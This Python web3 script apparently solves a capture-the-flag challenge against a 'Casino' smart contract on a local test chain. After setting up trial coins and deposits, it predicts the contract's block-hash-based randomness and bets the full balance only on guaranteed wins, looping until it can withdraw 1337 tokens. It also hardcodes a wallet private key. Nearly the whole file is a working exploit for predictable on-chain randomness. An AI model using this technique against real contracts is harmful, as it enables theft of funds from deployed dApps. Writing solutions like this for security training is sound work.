from web3 import Web3
from web3.middleware import geth_poa_middleware
import requests
from time import sleep

rpc_url = "http://127.0.0.1:7545/"

ducoin_contract_address = "0xCCE2eBa835eBed0946570E703B883F5Bfa20b489"
# the abi info generated by deploying the contract on remix, after that copying the web3deply abi from there.
ducoin_contract_abi = '[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"addr","type":"address"}],"name":"freeMoney","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"}]'

# the abi info generated by deploying the contract on remix, after that copying the web3deply abi from there.
casino_contract_address = "0xeE2dCaB106212E8EF6Cab7dFD1bE967edFf90E6c"
casino_contract_abi = '[{"inputs":[{"internalType":"address","name":"token","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"balances","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"deposit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"ducoin","outputs":[{"internalType":"contract DUCoin","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getTrialCoins","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"bet","type":"uint256"}],"name":"play","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}]'



wallet_address = "0xD15763233265960caFFc805a04e1D4b1EEB68dE3"

wallet_privatekey = "7f81a7ca567381206212e2857f7851a6db801d19d11e7d937d79bdba7562832a"

# Connect to the blockchain network
web3 = Web3(Web3.HTTPProvider(rpc_url))
web3.middleware_onion.inject(geth_poa_middleware, layer=0)

ducoin_contract = web3.eth.contract(address=ducoin_contract_address,abi=ducoin_contract_abi)
casino_contract = web3.eth.contract(address=casino_contract_address,abi=casino_contract_abi)

# Check if we are connected
def isConnected():
    if web3.isConnected() == True:
        print("[+] HOLLLAY, You are connected!")
    elif web3.isConnected() == False:
        print("[-] OPPS, You are not connected!")
    else:
        print("[!] I don't know what the heck is happening")
    
    print("\n----------------------------------\n")

# this function to build any transaction we need, since there is a bunch of transactions here
# using a function and pass the args to the transaction building function will be a lot easier and functional
def make_tx(tx_args):
    nonce = web3.eth.getTransactionCount(wallet_address)
    tx = tx_args.buildTransaction({
        'nonce' : nonce,
        'gas' : 100000,
        'gasPrice' : web3.toWei('4','gwei'),
        'from': wallet_address

    })
    signed_tx = web3.eth.account.sign_transaction(tx, wallet_privatekey)
    tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
    tx_receipt = web3.eth.waitForTransactionReceipt(tx_hash)
    if tx_receipt['status'] == 1:
        return 1
    else:
        return 0

# this function will setup our dApp and get it ready to hack
def dApp_setup():


    freeMoneyFunc = ducoin_contract.functions.freeMoney(casino_contract_address)
    freeMoneyFuncTx = make_tx(freeMoneyFunc)
    if freeMoneyFuncTx == 1:
        freeMoneyFunc_msg = "The minted amount to Casino Contract is: {}".format(ducoin_contract.functions.balanceOf(casino_contract_address).call())
        print(freeMoneyFunc_msg)
        print("\n----------------------------------\n")
    elif freeMoneyFuncTx == 0:
        print("[-] Your transaction revert")

    getTrialCoinsFunc = casino_contract.functions.getTrialCoins()
    getTrialCoinsFuncTx = make_tx(getTrialCoinsFunc)
    if getTrialCoinsFuncTx == 1:
        getTrialCoinsFunc_msg = "The DUC balance from get trail coins is: {}".format(ducoin_contract.functions.balanceOf(wallet_address).call())
        print(getTrialCoinsFunc_msg)
        print("\n----------------------------------\n")
    elif getTrialCoinsFuncTx == 0:
        print("[-] Your transaction revert")

    approveFunc = ducoin_contract.functions.approve(casino_contract_address,2000)
    approveFuncTx = make_tx(approveFunc)
    if approveFuncTx == 1:
        approveFunc_msg = "2000 has been approved to casino contract"
        print(approveFunc_msg)
        print("\n----------------------------------\n")
    elif approveFuncTx == 0:
        print("[-] Your transaction revert")
    

    depositFunc = casino_contract.functions.deposit(ducoin_contract.functions.balanceOf(wallet_address).call())
    depositFuncTx = make_tx(depositFunc)
    if depositFuncTx == 1:
        depositFunc_msg = "Coins deposited! Casino Balance is: {}".format(casino_contract.functions.balances(wallet_address).call())
        print(depositFunc_msg)
        getTrialCoinsFunc_msg = "The DUC balance from get trail coins is: {}".format(ducoin_contract.functions.balanceOf(wallet_address).call())
        print(getTrialCoinsFunc_msg)
        print("\n----------------------------------\n")
    elif depositFuncTx == 0:
        print("[-] Your transaction revert")
    

def get_block_hash(block_num):
    return web3.eth.getBlock(block_num)['hash']


ROUNDS_COUNTER = 0
def play_round():
    global ROUNDS_COUNTER
    ROUNDS_COUNTER += 1
    
    # simulating the PRNG function
    ab = int.from_bytes(get_block_hash(web3.eth.block_number), 'big')
    a = ab & 0xffffffff
    b = (ab >> 32) & 0xffffffff
    bet = 0
    if a % 6 == 0 and b % 6 == 0:
        bet = casino_contract.functions.balances(wallet_address).call()
        # print("First print bet: ",bet) # debugging print
    else:
        print("[!] The condition is not met. The bet value is: ",bet)
    # print("Second print bet: ",bet) # debugging print
    playFunc = casino_contract.functions.play(bet)
    playFuncTx = make_tx(playFunc)
    if playFuncTx == 1:
        print("[+] Your transaction succeeded")
    elif playFuncTx == 0:
        print("[-] Your transaction revert")

    return bet

def playHack():
    while True:
        r = play_round()
        if r:
            # print(r) # debugging print
            NewCasinoBalance = casino_contract.functions.balances(wallet_address).call()
            print("[+] Casino balance updated: {}".format(NewCasinoBalance))
            if NewCasinoBalance >= 1337:
                break

    print("[+] Number of ROUNDS_COUNTER you played: {}".format(ROUNDS_COUNTER))
    withdrawFunc = casino_contract.functions.withdraw(1337)
    withdrawFuncTx = make_tx(withdrawFunc)
    if withdrawFuncTx == 1:
        print("[+] Your transaction succeeded")
    elif withdrawFuncTx == 0:
        print("[-] Your transaction revert")

    print("[*] Withdrew coins, Your  DUC balance is {} DUC".format(ducoin_contract.functions.balanceOf(wallet_address).call()))
    print("[*] You still have {} DUC in the casino".format(casino_contract.functions.balances(wallet_address).call()))


if __name__ == '__main__':
    isConnected()
    dApp_setup()
    playHack()